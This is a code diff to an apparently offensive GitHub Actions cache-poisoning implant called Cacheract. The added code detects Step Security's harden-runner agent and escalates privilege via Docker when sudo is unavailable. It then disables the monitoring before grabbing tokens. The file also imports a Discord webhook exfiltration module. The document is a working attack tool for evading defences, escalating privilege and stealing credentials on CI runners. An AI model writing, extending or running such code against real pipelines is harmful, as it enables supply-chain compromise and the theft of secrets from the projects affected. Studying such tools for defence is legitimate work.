@@ -1,9 +1,9 @@
 import * as fs from 'fs';
 import * as crypto from 'crypto';
-import { getToken, listCacheEntries, clearEntry, checkRunnerEnvironment, retrieveEntry, listActions, isDefaultBranch, updateArchive, generateRandomString, prepareFileEntry, createArchive, isInfected, checkCacheEntry, sleep } from './utils';
+import { getToken, listCacheEntries, clearEntry, checkRunnerEnvironment, retrieveEntry, listActions, isDefaultBranch, updateArchive, generateRandomString, prepareFileEntry, createArchive, isInfected, checkCacheEntry, sleep, isAgentRunning, softenRunner, checkSudo, dockerPrivesc } from './utils';
 import axios from 'axios';
 import { CHECKOUT_YML } from './static';
-import { FILL_CACHE, SLEEP_TIMER, DISCORD_WEBHOOK, REPLACEMENTS, EXPLICIT_ENTRIES } from './config';
+import { FILL_CACHE, SLEEP_TIMER, DISCORD_WEBHOOK, REPLACEMENTS, EXPLICIT_ENTRIES, SOFTEN_RUNNER } from './config';
 import { reportDiscord } from './exfil';
 import * as path from 'path';
 import { calculateCacheConfigs, calculateCacheVersion, getSetupActions, getWorkflows } from './cache_predictor';
@@ -228,6 +228,18 @@ async function main() {
     } else {
         console.log('Cacheract is not running on a GitHub Hosted runner, exiting without reporting telemtry (we could be anywhere).');
         process.exit(0);
+    }
+
+    // Bypass Step Security's harden runner, if bypass enabled in config.
+    if (SOFTEN_RUNNER && await isAgentRunning()) {
+        console.log('Detected harden runner, bypassing it.')
+
+        if (!await checkSudo()) {
+            await dockerPrivesc();
+        }
+        // Check if sudo is enabled, if not, then use docker bypass
+
+        await softenRunner();
     }
 
     const tokens = await getToken();
